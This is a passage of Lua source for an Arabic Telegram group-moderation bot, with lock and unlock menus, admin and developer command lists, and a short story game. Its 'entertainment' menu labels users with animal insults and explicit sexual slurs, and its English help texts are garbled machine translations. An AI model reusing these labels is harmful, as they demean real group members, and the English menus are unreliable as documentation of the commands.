if text == 'بوت الحذف' or text == 'بوت حذف' or text == 'بوت حذف حسابات' then
local Text = [[
بوت  مسح حسابات،🛰️
فكر قبل لا تتسرع وتروح
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'BOT Telegram', url="t.me/LC6BOT"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/yhu79/7&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == "صلاحياته" and tonumber(msg.reply_to_message_id_) > 0 then    
if tonumber(msg.reply_to_message_id_) ~= 0 then 
function prom_reply(extra, result, success) 
Get_Info(msg,msg.chat_id_,result.sender_user_id_)
end  
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},prom_reply, nil)
end
end
------------------------------------------------------------------------
if text == "صلاحياتي" then 
if tonumber(msg.reply_to_message_id_) == 0 then 
Get_Info(msg,msg.chat_id_,msg.sender_user_id_)
end  
------------------------------------------------------------------------
if text and text:match('^صلاحياته @(.*)') then   
local username = text:match('صلاحياته @(.*)')   
if tonumber(msg.reply_to_message_id_) == 0 then 
function prom_username(extra, result, success) 
if (result and result.code_ == 400 or result and result.message_ == "USERNAME_NOT_OCCUPIED") then
SendText(msg.chat_id_,msg.id_,"- المعرف غير صحيح \n*")   
return false  end   

Get_Info(msg,msg.chat_id_,result.id_)
end  
tdcli_function ({ID = "SearchPublicChat",username_ = username},prom_username,nil) 
end 
end
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
end -- Chat_Type = 'GroupBot' 
end -- end msg 
--------------------------------------------------------------------------------------------------------------
function tdcli_update_callback(data)  -- clback
if data.ID == "UpdateChannel" then 
if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
database:srem(bot_id..'Chek:Groups','-100'..data.channel_.id_)  
end
end
if data.ID == "UpdateNewCallbackQuery" then
local Chat_id = data.chat_id_
local Msg_id = data.message_id_
local msg_idd = Msg_id/2097152/0.5
local Text = data.payload_.data_
Ok_id  = Text:match("(%d+)")  
if Text == 'okCaptcha'..data.sender_user_id_ then  
DeleteMessage(Chat_id, {[0] = Msg_id}) 
return https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. Chat_id .. "&user_id="..Ok_id .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
end
if Text == '/help1' then
if not Mod(data) then
local notText = '✘ عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
⇊ اوامر القفل والفتح 𖥔
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'قفل الاباحي', callback_data="/lockdul"},{text = 'فتح الاباحي', callback_data="/oppor"},
},
{
{text = 'قفل السب', callback_data="/Louis"},{text = 'فتح السب', callback_data="/tho"},
},
{
{text = 'قفل المحن', callback_data="/Gogh"},{text = 'فتح المحن', callback_data="/Omni"},
},
{
{text = 'قفل الدردشه', callback_data="/Lokll"},{text = 'فتح الدردشه', callback_data="/openqg"},
},
{
{text = 'قفل الدخول', callback_data="/lockaghv"},{text = 'فتح الاضافه', callback_data="/oppgagf"},
},
{
{text = 'قفل البوتات', callback_data="/lockbot"},{text = 'فتح البوتات', callback_data="/opabot"},
},
{
{text = 'قفل الاشعارات', callback_data="/lockash"},{text = 'فتح الاشعارات', callback_data="/opaash"},
},
{
{text = 'قفل الروابط', callback_data="/locklink"},{text = 'فتح الروابط', callback_data="/opalink"},
},
{
{text = 'قفل التثبيت', callback_data="/lockpin"},{text = 'فتح التثبيت', callback_data="/opapin"},
},
{
{text = 'قفل التعديل', callback_data="/lockedit"},{text = 'فتح التعديل', callback_data="/opaedit"},
},
{
{text = 'قفل الفارسيه', callback_data="/lockFars"},{text = 'فتح الفارسيه', callback_data="/opaFars"},
},
{
{text = 'قفل الانكليزيه', callback_data="/lockEngilsh"},{text = 'فتح الانكليزيه', callback_data="/opaEngilsh"},
},
{
{text = 'قفل تعديل الميديا', callback_data="/lockeditmed"},{text = 'فتح تعديل الميديا', callback_data="/opaeditmed"},
},
{
{text = 'قفل الانلاين', callback_data="/lockinline"},{text = 'فتح الانلاين', callback_data="/opainline"},
},
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
{
{text = 'اخفاء الاوامر', callback_data="/hide"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/GPhah' then
local Teext =[[
شيء لا يمشي إلا بالضرب فمن يكون؟
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تست', callback_data="/Karen"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagePhoto?chat_id='..Chat_id..'&photo=https://t.me/Qtdao/41&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/help2' then
if not Mod(data) then
local notText = '✘ عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
⇊ 「اوامر التفعيل」 والتعطي 𖥔
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تفعيل اطردني', callback_data="/opCick"},{text = 'تعطيل اطردني', callback_data="/lockCick"},
},
{
{text = 'تفعيل التحقق', callback_data="/lockCickp"},{text = 'تعطيل التحقق', callback_data="/opCickp"},
},
{
{text = 'تفعيل الرابط', callback_data="/locklinka"},{text = 'تعطيل الرابط', callback_data="/opalinka"},
},
{
{text = 'تفعيل مريم', callback_data="/Loumarem"},{text = 'تعطيل مريم', callback_data="/thomarem"},
},
{
{text = 'تفعيل صورتي', callback_data="/lookpohi"},{text = 'تعطيل صورتي', callback_data="/opphotop"},
},
{
{text = 'تفعيل الزخرفه', callback_data="/Lokzal"},{text = 'تعطيل الزخرفه', callback_data="/opeza"},
},
{
{text = 'تفعيل  انا مين', callback_data="/lockanmen"},{text = 'تعطيل انا مين', callback_data="/oppganmen"},
},
{
{text = 'تفعيل ضافني', callback_data="/lockbafne"},{text = 'تعطيل ضافني', callback_data="/opaVNOfe"},
},
{
{text = 'تفعيل الالعاب', callback_data="/lockgams"},{text = 'تعطيل الالعاب', callback_data="/opagams"},
},
{
{text = 'تفعيل الايدي', callback_data="/lockid"},{text = 'تعطيل الايدي', callback_data="/opaid"},
},
{
{text = 'تفعيل الترحيب', callback_data="/lockwelcm"},{text = 'تعطيل الترحيب', callback_data="/opawelcm"},
},
{
{text = 'تفعيل نسبه الكره', callback_data="/locnspm"},{text = 'تعطيل نسبه الكره', callback_data="/opansamp"},
},
{
{text = 'تفعيل نسبه الانوثه ', callback_data="/locknsamgk"},{text = 'تعطيل نسبه الانوثه ', callback_data="/opansamg"},
},
{
{text = 'تفعيل نسبة الحب', callback_data="/locknsak"},{text = 'تعطيل نسبة الحب', callback_data="/opanams"},
},
{
{text = 'تفعيل نسبة الرجوله', callback_data="/lockman"},{text = 'تعطيل  نسبة الرجوله', callback_data="/opamanh"},
},
{
{text = 'تفعيل نسبه جمالي', callback_data="/lockgmale"},{text = 'تعطيل نسبه جمالي', callback_data="/opagmale"},
},
{
{text = 'تفعيل حساب العمر', callback_data="/lockamr"},{text = 'تعطيل حساب العمر', callback_data="/opamar"},
},
{
{text = 'تفعيل all', callback_data="/lockall"},{text = 'تعطيل all', callback_data="/opaall"},
},
{
{text = 'تفعيل ردود السورس', callback_data="/lockreb"},{text = 'تعطيل ردود السورس', callback_data="/opareb"},
},
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
{
{text = 'اخفاء الاوامر', callback_data="/hide"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help3' then
if not Mod(data) then
local notText = '✘ عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
 𖥔️ 「 m 1 」 Orders Protect Group ⇊
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 Lock ↵Open + it
𖥔 Lock ↵» Open 「 All 」
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 Chat
𖥔 Knows
𖥔 Pictures
𖥔 videos
𖥔 Sticker
𖥔 files
Mobile moving
𖥔 Lift
𖥔 Audio
𖥔 Optiments
𖥔 Welcome
𖥔 The decorative
𖥔 Translate
𖥔 Responses
𖥔 Guidance
𖥔 Notifications
𖥔 Crown
𖥔 Delete link
𖥔 expulsion
𖥔 Games
𖥔 Novels
𖥔 towers
𖥔 Meanings of names
𖥔 Welcome
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 Links
𖥔 Guidance
𖥔 popcorn
𖥔 Bots
𖥔 Prohibited
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help90"},
},
{
{text = 'اخفاء الاوامر', callback_data="/hide"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help4' then
if not Mod(data) then
local notText = '✘ عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
 𖥔 「 m 3 」 3 𖥔 Tall orders ⇊
𖥔 Lifting ↵ Download + it
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 my son
𖥔 Crown for children
𖥔 Survey sons
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 Crown for girls
𖥔 Clear the girls
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
    𖥔 Habayeb survey..↑↓
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 my husVNOd
𖥔 Crown for couples
𖥔 Survey of couples
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 My wife
𖥔 Crown for the wives
𖥔 Wipe waves
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 Khayen
𖥔 Crown for him
𖥔 Clear the moon
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 Crown for the two
𖥔 Khiennine survey
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 Abit
𖥔 Crown for the mixture
𖥔 Survey
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 Crown for Paradise
𖥔 Storage survey
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help90"},
},
{
{text = 'اخفاء الاوامر', callback_data="/hide"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/hiddnt' then
if not Mod(data) then
local notText = '✘ عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
𖥔 「 m 4 」 Orders of members ⇊
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 Age account
𖥔 Picture ↵
𖥔 Quran
𖥔 Settings
𖥔 Qatari
𖥔 Delete ↵ Sell 「 Qatari
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 My messages ↵ Delete 
𖥔 Decorating ↵ Songs
𖥔 Movies ↵ Cartoon
𖥔 Translate + novels
𖥔 YouTube ↵ Games
𖥔 Weather + area
𖥔 Dark ↵link
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 My name is 
𖥔 My Juices ↵ Delete my juices
𖥔 Powers ↵ Ping
𖥔 Say + word
𖥔 Prohibited Words
𖥔 I am Maine
𖥔 Say + word
𖥔 Qatah ↵ dog
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 Source ↵Developer
𖥔 link ↵hands
𖥔 Rank ↵ Revealed
𖥔 Reply you, Bot
𖥔 Any your opinion Yapot
𖥔 Hino ↵ Hinha
𖥔 Boso ↵ her pussy
𖥔 Mido ↵ 
𖥔 Delete link
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help90"},
},
{
{text = 'اخفاء الاوامر', callback_data="/hide"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help5' then
if not Mod(data) then
local notText = '✘ عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
 𖥔مرحب بيك في اوامر للمطورين 𖥔
اوامر المطورين ⇊
「المطور 」  ⇊
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔تفعيل ← تعطيل 
 𖥔المجموعات ← المشتركين ← الاحصائيات
 𖥔رفع ← تنزيل منشئ اساسي
 𖥔مسح الاساسين ← المنشئين الاساسين
 𖥔مسح المنشئين ← المنشئين
 𖥔اسم ~ ايدي + بوت غادر 
 𖥔اذاعه 
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
「المطور الاساسي+ المطور الثانوي」
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔تفعيل
 𖥔تعطيل
 𖥔مسح الاساسين
 𖥔المنشئين الاساسين
 𖥔رفع/تنزيل منشئ اساسي
 𖥔رفع/تنزيل مطور اساسي 
 𖥔  رفع/تنزيل مدير عام
 𖥔  رفع /تنزيل ادمن عام
 𖥔مسح المطورين
 𖥔المطورين
 𖥔رفع | تنزيل مطور
 𖥔اسم البوت + غادر
 𖥔غادر
 𖥔اسم بوت + الرتبه
 𖥔تحديث السورس
 𖥔حضر عام
 𖥔كتم عام
 𖥔الغاء العام
 𖥔قائمه العام
 𖥔مسح قائمه العام
 𖥔جلب النسخه
 𖥔رفع النسخه
 𖥔 جلب المشتركين
 𖥔 رفع المشتركين
 𖥔اذاعه خاص
 𖥔اذاعه
 𖥔اذاعه بالتوجيه
 𖥔اذاعه بالتوجيه خاص
 𖥔اذاعه بالتثبيت
 𖥔جلب نسخه البوت
 𖥔رفع نسخه البوت
 𖥔ضع عدد الاعضاء + العدد
 𖥔ضع كليشه المطور
 𖥔تفعيل/تعطيل الاذاعه
 𖥔تفعيل/تعطيل البوت الخدمي
 𖥔تفعيل/تعطيل التواصل
 𖥔تغير اسم البوت
 𖥔اضف/مسح رد عام
 𖥔الردود العامه
 𖥔مسح الردود العامه
 𖥔الاشتراك الاجباري
 𖥔تعطيل الاشتراك الاجباري
 𖥔تفعيل الاشتراك الاجباري
 𖥔مسح رساله الاشتراك
 𖥔تغير رساله الاشتراك
 𖥔تغير الاشتراك
 𖥔الاحصائيات
 𖥔المشتركين
 𖥔المجموعات 
 𖥔تفعيل/تعطيل المغادره
 𖥔مسح الجروبات
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
{
{text = 'اخفاء الاوامر', callback_data="/hide"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help6' then
if not Mod(data) then
local notText = '✘ عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
    「اوامر الاعضاء ⇊」     
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔   غنيلي ⇔ حساب العمر   
 𖥔   صورتي ⇔ نسبه جمالي
 𖥔   نقاطي
 𖥔    مسح ⇔ بيع 「نقاطي 」 
 𖥔   رسائلي ⇔  مسح 「رسائلي 」 
 𖥔   زخرفه ⇔ اغاني 
 𖥔   اسمي ⇔ الرتبه
 𖥔  جهاتي 
 𖥔  صلاحياتي
 𖥔  قول +الكلمه
 𖥔  تفعيل  تعطيل+ اطردني   
 𖥔   سورس ⇔ المطور
 𖥔   الرابط ⇔ ايدي
 𖥔   رتبتي ⇔ كشف
 𖥔   رد  انت يا بوت
 𖥔  ي رايك يابوت
 𖥔   هينو ⇔ هينها
 𖥔   بوسو ⇔ بوسها
 𖥔   بتحب دي ⇔ بتحب ده
 𖥔  بوت الحذف⇔رابط الحذف
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
{
{text = 'اخفاء الاوامر', callback_data="/hide"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help7' then
if not Mod(data) then
local notText = '✘ عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
اوامر 「التسليه」  ⇊
رفع ⇔ تنزيل + الامر
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔رفع + تنزيل ← متوحد
 𖥔تاك للمتوحدين
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔رفع + تنزيل ← كلب
 𖥔تاك للكلاب
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔رفع + تنزيل ← قرد
 𖥔تاك للقرود
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔رفع + تنزيل ← زوجتي
 𖥔تاك للزوجات
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔رفع + تنزيل ← قلبي
 𖥔تاك لقلبي
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔رفع + تنزيل ← بقره
 𖥔تاك للبقرات
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔رفع + تنزيل ← ارمله
 𖥔تاك للارامل
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔رفع + تنزيل ← خول
 𖥔تاك للخولات
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔رفع + تنزيل ← حمار
 𖥔تاك للحمير
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔رفع + تنزيل ← مزه
 𖥔تاك للمزز
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔رفع + تنزيل ← وتكه
 𖥔تاك للوتكات
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔رفع + تنزيل ← كس
 𖥔تاك للاكساس
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔رفع + تنزيل ← ابني
 𖥔تاك لولادي 
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔رفع + تنزيل ← بنتي
 𖥔تاك لبناتي
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔رفع + تنزيل ← خاين
 𖥔تاك للخاينين
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
 𖥔رفع  ← علي زبي
 𖥔تنزيل ←من زبي 
 𖥔تاك للمتناكين
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help8"},
},
{
{text = 'اخفاء الاوامر', callback_data="/hide"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/hide' then
local hide = 'تم اخفاء الاوامر'
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(hide)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(hide).."&show_alert=false")
DeleteMessage(Chat_id, msg_idd)
return false
end
if Text == '/help8' then
if not Mod(data) then
local notText = '✘ عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
 اهلا بك في قسم الاوامر ..↑↓
اختر الامر الذي تريدها .↑↓
ده من الازرار بلاسفل . ↓
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '◗اوامر المطورين◖', callback_data="/help5"},{text = '◗اوامر التسليه◖', callback_data="/help7"},
},
{
{text = '◗اوامر الاعضاء◖', callback_data="/help6"},
},
{
{text = '◗اوامر التعطيل◖', callback_data="/help2"},{text = '◗اوامر القفل◖', callback_data="/help1"},
},
{
{text = '•تــغــير الــلــغــه•', callback_data="/help90"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end

if Text == '/help9' then
if not Mod(data) then
local notText = '✘ عذرا الاوامر هذه لا تخصك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
𖥔 「 m 5 」 Orders of developers ⇊
𖥔 Developer ←⇊
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 Lifting «download 「 owner 」
𖥔 Change the group link
𖥔 Destination of groups
𖥔 Destination by guidance for groups
𖥔 A radio face
𖥔 Special radio
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 A special guidance
𖥔 Fix the installation
𖥔 bring back copy
𖥔 raise its backup copy
𖥔 Statistics
𖥔 Delete owners
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
   𖥔 Basic Developer..↑↓
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 Add "← Delete a general response
𖥔 Lifting «download 「 special year 」
𖥔 Featured Survey
𖥔 General responses
𖥔 Delete public responses
𖥔 A special guidance
𖥔 Destination by guidance for groups
𖥔 Fix the installation
𖥔 A radio face
𖥔 bring ↵ raising 
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 Statistics
𖥔 Lifting «download 「 Developer 」
𖥔 Developers ↵ Delete developers
𖥔 Put the name of the bot
𖥔 Change the departing message
𖥔 Prohibition ↵ Mute 「 General 」
𖥔 General makers
𖥔 Preventors General
𖥔 Canceling the general
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help90"},
},
{
{text = 'اخفاء الاوامر', callback_data="/hide"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help10' then
local help_text = database:get(bot_id..'help10_text')
local Teext =[[
𖥔 「 m 2 」 2 𖥔 entertainment orders ⇊
𖥔 Lifting ↵» Download + it
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 and Take
𖥔 Crown for Soutat
𖥔 Wipe Wattat
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔
𖥔 Crown for drapes
𖥔 Clear Docks
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 Jeep
𖥔 Crown for bodies
𖥔 Scanning
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 animal
𖥔 Crown for animals
𖥔 Animals
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 failed
𖥔 Crown for failure
𖥔 Scan of failure
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 Dermatology
𖥔 Crown for perforation
𖥔 Scanning
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
𖥔 Catte
𖥔 Crown for cats
𖥔 Cats survey
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔𝙱𝙰𝙲𝙺↵', callback_data="/help90"},
},
{
{text = 'اخفاء الاوامر', callback_data="/hide"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end

if Text == '/help90' then
local Teext =[[
𖥔 Welcome to the orders section↑↓
●○━━━━ꪜꫀꪀꪮꪑ━━━━○●
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '˹protection˼', callback_data="/help3"},{text = '˹addictive˼', callback_data="/help10"},
},
{
{text = '˹Administration˼', callback_data="/help4"},
},
{
{text = '˹Developer˼', callback_data="/help9"},{text = '˹Disabled orders˼', callback_data="/hiddnt"},
},
{
{text = '•تــغــير الــلــغــه•', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
------------------------------ callback add dev mr VNO
if Text == '/may' then
local Teext =[[
• يلا بنا نبحث عن المنزل •
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'هيا بنا', callback_data="/afkl"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/afkl' then
local Teext =[[
• في صوت هل صدر من الامام ام الخلف •
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الامام', callback_data="/amen"},{text = 'الخلف', callback_data="/should"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/amen' then
local Teext =[[
• هيا بنا نذهب الي الامام لنرا المنزل •
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'هيا', callback_data="/have"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/should' then
local Teext =[[
• هيا بنا نذهب الي الخلف لنرا المنزل •
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'هيا', callback_data="/have"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/have' then
local Teext =[[
• لقد وصلنا الى المنزل شكراَ جزيلَ انتطرني ثواني وسوف اعود •
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'منتظر', callback_data="/VBV"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end

if Text == '/VBV' then
local Teext =[[
• لقد عودت إليك ظهر شيئ •
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'احد ما خرج من المنزل', callback_data="/ALLL"},
},
}
